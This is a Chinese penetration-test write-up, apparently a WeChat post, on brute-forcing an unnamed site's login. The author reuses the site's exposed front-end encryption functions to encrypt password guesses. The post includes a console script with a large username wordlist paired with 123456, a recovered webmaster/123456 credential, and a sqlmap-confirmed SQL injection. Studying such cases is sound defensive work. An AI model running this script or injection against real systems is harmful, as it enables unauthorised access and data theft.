#  记一次前端js加解密泄露引发的漏洞   
C4安全团队运营  不秃头的安全   2025-04-16 09:54  
  
## 记一次前端js加解密泄露引发的漏洞  
```
前言：本文中涉及到的相关技术或工具仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担，如有侵权请私聊删除。还在学怎么挖通用漏洞和src吗？知识星球在最下方，续费也有优惠私聊~~考安全证书请联系vx咨询。
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fWaOQhXOf0cibja9IiaN9XvbmE5jLs5PByGh6NEsygeaAwonoQf8yKn2DtF6ZC0FshCkm3icyxic2lWqQ/640?wx_fmt=other&from=appmsg "")  
  
  
前端js中往往存有前后端交互时候的加密方法，稍加利用就能达到对加密密码进行爆破的目的。本文中的案例就是这样展开的，从加解密方法泄露到弱口令进入后台，最后再后台SQL注入获取权限  
  
首先测试系统遇到经典登录框  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiaseBt1ZIia2EZ9yKdp0URia8aKwjW3Rr9tLzibkpPNofc9BnyxuBjccgW2Q/640?wx_fmt=png&from=appmsg "")  
  
输入用户名密码，点击登录以后会抓到一个如下登录数据包：  
  
请求路径为/log_in，传参为加密的param  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiaslmjibuSwDyMicnWuXfxmvteec3vWnYbjqtJFIuW2jLVcxUOnUd9f85qQ/640?wx_fmt=png&from=appmsg "")  
  
param参数明显加密了，但是加解密方法写在前端js当中  
  
观察网站系统加载的js，  
在loginbar.js中，写明了参数加密的方法是xs_strEnccs  
  
参数格为：  
'username='+username+'&password='+password+'&rootsrc=3'  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tias59tOZaHdRsaCbLOicH6BaG3OwVGFQBeibLHSgxnkfLicdRwWrOOGZkShw/640?wx_fmt=png&from=appmsg "")  
  
追踪方法，发现xs_strEnccs又调用了strEnc方法，而解密参数的方法名称为xs_strDec  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasibaoXvBhLPQdwIZjOY6DtKXgZFdDXd5oH4MaRYrSiaov54FZchWfEELg/640?wx_fmt=png&from=appmsg "")  
  
点击忘记密码跳转到其他页面，观察js代码  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasJz6hrrYiatnEFoia1lTROqgerAibwCVGsYOEHDyJxEYyVH1rib1IseA35g/640?wx_fmt=png&from=appmsg "")  
  
在该找回密码页面中，可以找到strEnc方法，这个方法正式对密文进行加密的子方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasOndDSPMP6phc97ibVSEHriaQPZCXkw156uahKOBtFic7ngibbOTeLzTzoA/640?wx_fmt=png&from=appmsg "")  
  
这样到这一步，完整的加密方法都理清楚了，大致步骤如下  
```
xs_strEnccs调用了strEnc，传参为登录字符串，还有654321
```  
  
登录时候也没有验证码，可以构造用户名不唯一、密码默认为123456的登录字符串来进行弱口令爆破。比如这样的：  
```
username=xxx&password=123456&rootsrc=3
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasRpSLmK2IReTT8H7DZgg2XM54G0MNgBkoA2px6WNBgSJcGIicAdXbf2g/640?wx_fmt=png&from=appmsg "")  
  
为了图方便，我写了一个可以直接在浏览器控制台输出加密param的脚本，将最简单的弱口令密码本在控制台中进行加密转换为密文：  
  
```
const usernames = ["admin", "test", "test01", "test1", "test2", "weblogic", "ftp", "manager", "manage", "user", "guest", "administrator",
"account", "super", "superuser", "master", "imap", "memcached", "mongodb", "oracle", "pop3", "postgresql", "rdp",
"redis", "smb", "smtp", "sqlserver", "ssh", "svn", "telnet", "tomcat", "vnc", "xiaomi", "huawei", "apple", "topsec",
"360", "qihoo", "1688", "aliyun", "alipay", "www", "web", "webadmin", "webmaster", "anonymous", "jboss", "1", "admin1",
"root", "sever", "system", "develop", "developer", "developers", "development", "demo", "device", "devserver", "devsql",
"0", "01", "02", "03", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "2", "20", "3", "3com", "4", "5",
"6", "7", "8", "9", "ILMI", "a", "zhangwei", "wangwei", "wangfang", "liwei", "lina", "zhangmin", "lijing", "wangjing",
"liuwei", "wangxiuying", "zhangli", "lixiuying", "wangli", "zhangjing", "zhangxiuying", "liqiang", "wangmin", "limin",
"wanglei", "liuyang", "wangyan", "wangyong", "lijun", "zhangyong", "lijie", "zhangjie", "zhanglei", "wangqiang", "lijuan",
"wangjun", "zhangyan", "zhangtao", "wangtao", "liyan", "wangchao", "liming", "liyong", "wangjuan", "liujie", "liumin", "lixia",
"lili", "zhangjun", "wangjie", "zhangqiang", "wangxiulan", "wanggang", "wangping", "liufang", "liuyan", "liujun", "liping",
"wanghui", "chenjing", "liuyong", "liling", "liguiying", "wangdan", "ligang", "lidan", "wangpeng", "liutao", "chenwei",
"zhanghua", "liujing", "litao", "wangguiying", "zhangxiulan", "lihong", "lichao", "liuli", "zhangguiying", "wangyulan",
"zhangpeng", "lixiulan", "zhangchao", "wangling", "zhangling", "lihua", "wangfei", "zhangyulan", "wangguilan", "wangying",
"liuqiang", "chenxiuying", "liying", "lihui", "limei", "chenyong", "wang", "lifang", "zhangguilan", "libo", "yangyong",
"wangxia", "liguilan", "wangbin", "lipeng", "zhangping", "zhanghui", "zhangyu", "liuju", "xujing", "yanghong", "yangziwen", "zhangshulan", "zhangwen", "chenguilan", "zhouli", "lishuhua", "chen", "machao",
"liujianguo", "liguihua", "wangfenglan", "lishulan", "chenxiuzhen"
];
for (let i = 0; i < usernames.length; i++) {
const result = 'username='+usernames[i]+'&password=123456&rootsrc=3' const result2 = xs_strEnccs(result); console.log(result2); }
```  
  
调用现成的js里的加密函数进行加密，效果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasClMxeumKzDyO13wnj8UicLjYl80skic2icSYFezbn1jVjUzC9CicPfzh4A/640?wx_fmt=png&from=appmsg "")  
  
加密完的字典之后，将登录的数据包直接转发到burp的intruder中替换参数进行爆破  
  
爆破显示状态码为537时，登录成功，此时的param为  
```
2D54C345E9883022B05FA18CDC024536EE4A58B6C5BBA9449ED0BAF1115B734923153A77E0449A6FC2CF1D90227EB5EE4D4C437553E62E12CA570C1934CE6FCC5D98631EB611684F6853A618AFAAF53267ADABEF2D9C279B
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasvPv97XiaQkAXJhmEUAmUKekyykFLcygl1Yk8EsjwjRy8L9WoMAZwJgw/640?wx_fmt=png&from=appmsg "")  
  
此时再在js中调用解密方法，解密弱口令如下：  
  
webmaster/123456  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/EXTCGqBpVJRPB8LAoicALgsdtxmen9tias1CahBPtX7tSEvya0JZGc7MZJ1wbI3eqrsRDQHX8u1T2o7upgyPrY6A/640?wx_fmt=jpeg "")  
  
但是直接输入账号密码webmaster/123456登录会报错，还需要传个参数rootsrc=3，这应该是另一种登录方式中存在的弱口令  
  
所以登录时抓包，再替换数据包里面的param值，放包以后就能正常登录  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasrawLRVtNUDpOYC639lRZUS88ibk4Q8d3dlm0vOZTSZkYVGvFQWs5hmQ/640?wx_fmt=png&from=appmsg "")  
  
最后成功以webmaster账户登录进入后台  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiaswSSYn5QRztdmPAGG4ZjzqeH9KZZXXF7jN8ybJqY5qYEYibNtU5y2wicg/640?wx_fmt=png&from=appmsg "")  
  
后台用户管理处泄露大量敏感信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasIYguFZOm39EvHibEribAJB5aI5KvFRLuYqQ5ba24FAzra3QFfJliaY51w/640?wx_fmt=png&from=appmsg "")  
  
接下来就是后台漏洞挖掘了  
  
  
登录成功webmaster后，可以发现一个后台接口存在注入，这里没存截图只有个数据包，完全没有过滤的注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasWA3jnf1jcIuBaCYCHpPXXlMt1DialgODALvzoAZZgWUBwRenCy3Ve2Q/640?wx_fmt=png&from=appmsg "")  
  
参数classname存在注入，使用sqlmap进行验证数据包，后端数据库为Oracle  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tiasqeaWecksvgUqI1Pn5ibZRYoWzwTy3YhkY9tqV1X1qlWuz9icib3tsBbMw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRPB8LAoicALgsdtxmen9tias1c8ILPAKTScvzbicfKhjiceB0pviarLOBSVq6QDN7nbbEk7YAQOtt8WYQ/640?wx_fmt=png&from=appmsg "")  
  
测试结束  
  
往期推荐：  
  
[](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247488962&idx=1&sn=a26633d99fee43bf45e99597ff707d00&scene=21#wechat_redirect)  
[](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247488931&idx=1&sn=1f3be7e7b57d73d7ccf52de34746bac6&scene=21#wechat_redirect)  
[](https://mp.weixin.qq.com/s?__biz=Mzg3NzkwMTYyOQ==&mid=2247488900&idx=1&sn=ae19a94a573cc8b300bd571039149b36&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/5XMBWuTy1YdnTAAczP5ENGmlT9xMEAsJuTqV6jib7IyxImNprOeHxrbPLFkKfEPfh2U829KgfaTYB6NLOmx9Ykg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**关于我们:**  
  
感谢各位大佬们关注-不秃头的安全，后续会坚持更新渗透漏洞思路分享、安全测试、好用工具分享以及挖掘SRC思路等文章，同时会组织不定期抽奖，希望能得到各位的关注与支持，考证请加联系vx咨询。  
  
  
## 1. 需要考以下各类安全证书的可以联系  
  
绝对低价绝对优惠，CISP、PTE/PTS、DSG、IRE/IRS、NISP、PMP、CCSK、CISSP、ISO27001、IT服务项目经理等等巨优惠，学生报pte 有优惠，想加群下方链接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fWaOQhXOf0cibja9IiaN9XvbmuZfhZj5ufFf22ViaiaArTUr5dm7JlRwLpBlYsf38Xu76Dsnq3xxzBr1A/640?wx_fmt=jpeg&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fXFlWiaGLukicZa30CPQibNT2Cu261kSHeQxBEYHMlPrYiabs5q6LVx7ex8jS0Q5MYOWZmVnCR7YFtBqg/640?wx_fmt=jpeg&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 2. 需要入星球的可以私聊优惠  
  
星球里有什么？  
```
1、维护更新src、cnxd、cnnxd专项漏洞知识库，包含原理、挖掘技巧、实战案例2、fafo/零零信安高级会员key3、POC及CXXD及CNNXD通用报告详情分享思路4、知识星球专属微信“内部圈子交流群”5、分享src挖掘技巧tips6、最新新鲜工具分享7、不定期有工作招聘内推（工作/护网内推）8、攻防演练资源分享(免杀，溯源，钓鱼等)9、19个专栏会持续更新~提前续费有优惠，好用不贵很实惠
```  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DicRqXXQJ6fXFlWiaGLukicZa30CPQibNT2Csh9A9qkO6QC8Cg4TpA0aP7D0RR0YJ5bhWYWeNtLibia6DaCvkQwnz00A/640?wx_fmt=jpeg&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
## 3、其他合作（合法合规）  
  
1、承接各种安全项目，需要攻防团队或岗位招聘都可代发、代招（灰黑勿扰）；  
  
2、各位安全老板需要文章推广的请私聊，承接合法合规推广文章发布，可直发、可按产品编辑推广；  
合作、推广代发、安全项目、岗位代招均可发布![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/DicRqXXQJ6fUnGo23GUq3ovbSwOYN8EMeElSz5gB5YUZyF295hXmx2ibZd8Il3WYxrY7JoEKLXXMlTD7LftvibzuQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
